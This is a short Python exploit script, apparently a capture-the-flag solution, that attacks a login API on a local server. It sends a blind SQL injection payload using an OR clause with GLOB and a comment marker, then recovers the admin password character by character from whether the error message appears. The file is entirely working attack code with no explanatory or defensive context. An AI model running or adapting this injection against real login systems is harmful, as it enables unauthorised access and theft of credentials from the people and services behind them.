import requests
import time
import json
import string

HOST = "http://localhost:3000"
API = "/api/login"
CHARSET = string.ascii_letters + string.digits + "_{}"

def payload(password: str) -> str:
    return f"') OR (password GLOB '{password}*' ) --"

def exploit() -> str:
    password = ""
    while True:
        time.sleep(0.11)
        for c in CHARSET:
            data = json.dumps({"username": "admin", "password": f'"{payload(password + c)}"'})
            r = requests.post(HOST + API, data=data)
            if "Identifiants incorrectes." not in r.text:
                password += c
                print(password)
                break

    return password

if __name__ == "__main__":
    print(exploit())

